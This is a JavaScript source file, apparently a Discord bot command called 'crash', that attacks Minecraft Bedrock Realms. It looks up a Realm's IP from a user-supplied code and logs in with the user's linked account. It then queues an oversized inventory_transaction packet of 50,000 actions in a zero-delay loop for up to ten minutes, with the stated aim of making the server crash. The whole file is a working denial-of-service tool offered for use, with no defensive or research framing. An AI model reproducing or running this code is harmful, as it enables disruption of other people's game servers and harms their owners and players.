const bpClient = require("../../common/Client.js");
const RealmAPI = require("../../common/Realm.js");

const { cleanLeftovers, generateRandomString, translateDisconnectMessage } = require("../../common/Util.js");

const crashMap = new Map();

const ITP = {
    transaction: {
        legacy: { legacy_request_id: 0 },
        transaction_type: "normal",
        actions: new Array(50000).fill({
            source_type: "global",
            slot: 25,
            old_item: { network_id: 0 },
            new_item: { network_id: 0 }
        })
    }
}

module.exports = {
    name: "crash",
    description: "Makes the server crash.",
    cooldown: 15000,
    requireLink: true,
    options: [
        {
            type: 3,
            name: "input",
            description: "Realm Code or ID",
            required: true,
            min_length: 6,
            max_length: 15
        }
    ],
    execute: async (interaction, args, embedConstants, dbUser) => {
        const { input } = args;
        const { user } = interaction;

        let address = {}, timeout, interval, crashInterval;

        switch (crashMap.get(user.id)) {
            case 64:
                crashMap.delete(user.id);
                break;
            default:
                if (crashMap.get(user.id)) {
                    embedConstants.embed.description = `**Request Information**\n${embedConstants.emojis.DR}Connection - ${embedConstants.emojis.fail}\n${embedConstants.emojis.RT}You're already doing this request.`;
                    return interaction.createFollowup({ embed: embedConstants.embed });
                }
                break;
        }

        let RAPI = await RealmAPI(user.id);
        let realm = /^\d+$/.test(input) ? await RAPI.getRealmInfoByID(input) : await RAPI.getRealmInfo(input);

        crashMap.set(user.id, 1);

        if (typeof realm.status === "number" && realm.status) {
            switch (realm.status) {
                case 403:
                    embedConstants.embed.description = `**Request Information**\n${embedConstants.emojis.DR}Connection - ${embedConstants.emojis.fail}\n${embedConstants.emojis.RT}${realm?.body?.errorMsg} (${realm?.body?.errorCode})`;
                    break;
                case 404:
                    embedConstants.embed.description = `**Request Information**\n${embedConstants.emojis.DR}Connection - ${embedConstants.emojis.fail}\n${embedConstants.emojis.RT}${realm?.body?.errorMsg} (${realm?.body?.errorCode})`;
                    break;
                case 500:
                    embedConstants.embed.description = `**Request Information**\n${embedConstants.emojis.DR}Connection - ${embedConstants.emojis.fail}\n${embedConstants.emojis.RT}Sent a bad HTTP request to the Realms API.`;
                    break;
                case 502:
                case 504:
                    embedConstants.embed.description = `**Request Information**\n${embedConstants.emojis.DR}Connection - ${embedConstants.emojis.fail}\n${embedConstants.emojis.RT}Realms API is currently undergoing a outage.`;
                    break;
                default:
                    embedConstants.embed.description = `**Request Information**\n${embedConstants.emojis.DR}Connection - ${embedConstants.emojis.fail}\n${embedConstants.emojis.RT}Try again later or contact Aere support. (Status ${realm.status})`;
                    break;
            }

            crashMap.delete(user.id);

            return interaction.createFollowup({ embed: embedConstants.embed, components: [] });
        }

        if (realm.expired || realm.state === "CLOSED") {
            embedConstants.embed.description = `**Request Information**\n${embedConstants.emojis.DR}Connection - ${embedConstants.emojis.fail}\n${embedConstants.emojis.RT}Realm is ${realm.expired ? "expired" : "closed"}.`;

            crashMap.delete(user.id);

            return interaction.createFollowup({ embed: embedConstants.embed, components: [] });
        }

        let realmIP = await RAPI.getRealmIP(realm.id);

        if (typeof realmIP.status === "number" && realmIP.status) {
            switch (realmIP.status) {
                case 403:
                    embedConstants.embed.description = `**Request Information**\n${embedConstants.emojis.DR}Connection - ${embedConstants.emojis.fail}\n${embedConstants.emojis.RT}${realm?.body?.errorMsg} (${realm?.body?.errorCode})`;
                    break;
                case 404:
                    embedConstants.embed.description = `**Request Information**\n${embedConstants.emojis.DR}Connection - ${embedConstants.emojis.fail}\n${embedConstants.emojis.RT}${realm?.body?.errorMsg} (${realm?.body?.errorCode})`;
                    break;
                case 500:
                    embedConstants.embed.description = `**Request Information**\n${embedConstants.emojis.DR}Connection - ${embedConstants.emojis.fail}\n${embedConstants.emojis.RT}Sent a bad HTTP request to the Realms API.`;
                    break;
                case 503:
                    embedConstants.embed.description = `**Request Information**\n${embedConstants.emojis.DR}Connection - ${embedConstants.emojis.fail}\n${embedConstants.emojis.RT}Retry your request again.`;
                    break;
                case 502:
                case 504:
                    embedConstants.embed.description = `**Request Information**\n${embedConstants.emojis.DR}Connection - ${embedConstants.emojis.fail}\n${embedConstants.emojis.RT}Realms API is currently undergoing a outage.`;
                    break;
                default:
                    embedConstants.embed.description = `**Request Information**\n${embedConstants.emojis.DR}Connection - ${embedConstants.emojis.fail}\n${embedConstants.emojis.RT}Try again later or contact Aere support. (Status ${realm.status})`;
                    break;
            }

            crashMap.delete(user.id);

            return interaction.createFollowup({ embed: embedConstants.embed, components: [] });
        }

        address.ip = realmIP.address?.substring(0, realmIP.address.indexOf(':'));
        address.port = Number(realmIP.address?.substring(realmIP.address.indexOf(':') + 1));

        embedConstants.embed.description = `**Request Information**\n${embedConstants.emojis.DR}Connection - ${embedConstants.emojis.check}\n${embedConstants.emojis.RT}Request - ${embedConstants.emojis.loading}`;

        const msg = await interaction.createFollowup({
            embed: embedConstants.embed,
            components: [{
                type: 1,
                components: [
                    {
                        type: 2,
                        label: "Cancel",
                        style: 4,
                        custom_id: generateRandomString(6)
                    }
                ]
            }]
        });

        let configuration = {
            namespoof: { enabled: false, username: "" },
            ssbp: { enabled: false, type: 0 },
            batchingInterval: 0
        };

        const client = await bpClient(address, dbUser, realm, configuration);

        interval = setInterval(() => {
            if (crashMap.get(user.id) === 64) {
                client.disconnect();
                cleanLeftovers([timeout], [interval, crashInterval]);
                crashMap.delete(user.id);

                embedConstants.embed.description = `**Request Information**\n${embedConstants.emojis.DR}Request - ${embedConstants.emojis.fail}\n${embedConstants.emojis.RT}Request cancelled.`;

                return msg.edit({ embed: embedConstants.embed, components: [] });
            }
        }, 0)

        client.on("kick", (packet) => {
            if (!crashMap.get(user.id) || crashMap.get(user.id) === 64) return;

            client.disconnect();
            cleanLeftovers([timeout], [interval, crashInterval]);
            crashMap.delete(user.id);

            embedConstants.embed.description = `**Request Information**\n${embedConstants.emojis.DR}Request - ${embedConstants.emojis.fail}\n${embedConstants.emojis.RT}${translateDisconnectMessage(packet.message)}`;

            if (packet.message.includes("/multiplayer/bedrock/authentication")) {
                embedConstants.embed.description = `**Request Information**\n${embedConstants.emojis.DR}Request - ${embedConstants.emojis.fail}\n${embedConstants.emojis.RT}You're banned from Minecraft.`;
                RAPI.XboxAPI.cleanLinkData(dbUser);
            }

            if (packet.message.includes("Lost connection")) {
                embedConstants.embed.description = `**Request Information**\n${embedConstants.emojis.DR}Connection - ${embedConstants.emojis.check}\n${embedConstants.emojis.RT}Request - ${embedConstants.emojis.check}`;
            }

            return msg.edit({ embed: embedConstants.embed, components: [] });
        })

        client.on("play_status", (packet) => {
            if (packet.status !== "login_success") return;

            crashInterval = setInterval(() => {
                client.queue("inventory_transaction", ITP);
            }, 0);

            timeout = setTimeout(() => {
                client.disconnect();
                cleanLeftovers([timeout], [interval, crashInterval]);
                crashMap.delete(user.id);

                embedConstants.embed.description = `**Request Information**\n${embedConstants.emojis.DR}Connection - ${embedConstants.emojis.check}\n${embedConstants.emojis.RT}Request - ${embedConstants.emojis.check}`;

                return msg.edit({ embed: embedConstants.embed, components: [] });
            }, 600 * 1000);
        })
    },
    componentPressEvent: cancel
};

async function cancel(interaction) {
    const { user } = interaction;

    crashMap.set(user.id, 64);

    await interaction.acknowledge();
};